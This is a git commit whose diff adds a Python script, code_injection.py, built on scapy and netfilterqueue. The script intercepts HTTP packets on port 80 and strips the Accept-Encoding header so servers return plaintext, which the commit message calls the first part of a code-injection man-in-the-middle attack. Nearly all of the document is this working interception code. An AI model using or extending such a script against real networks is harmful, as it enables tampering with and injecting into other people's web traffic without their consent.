047612d2232eec1a9197b0e9385514131438a0f3
root <fonso.gonzalezsan@gmail.com>
2020-05-16 14:55:48 -0400

    update replace packages, succesfully worked create an example and show it on ReadmeFile Replace_download Code injection first part: modify request over http layer for deleting Accept-Encoding:.*?\\r\\n like a regexpression on packet. When you replace that the browser allow encoding, the server send response of html/images Javascript as plaintext

---
+++ code_injection.py
@@ -0,0 +1,28 @@
+#!/usr/bin/ebv python
+
+import netfilterqueue
+import scapy.all as scapy
+import re
+ack_list =[]
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        #print(scapy_packet.show())
+        if scapy_packet[scapy.TCP].dport == 80:
+            print("[+] request type  HTTP ")
+            modify_packet= re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load)
+            scapy_packet[scapy.Raw].load=modify_packet
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.TCP].chksum
+            #print(scapy_packet.show())
+            packet.set_payload(str(scapy_packet))
+        elif scapy_packet[scapy.TCP].sport == 80:
+            print("[+] response type HTTP ")
+            print(scapy_packet.show())
+    packet.accept()
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
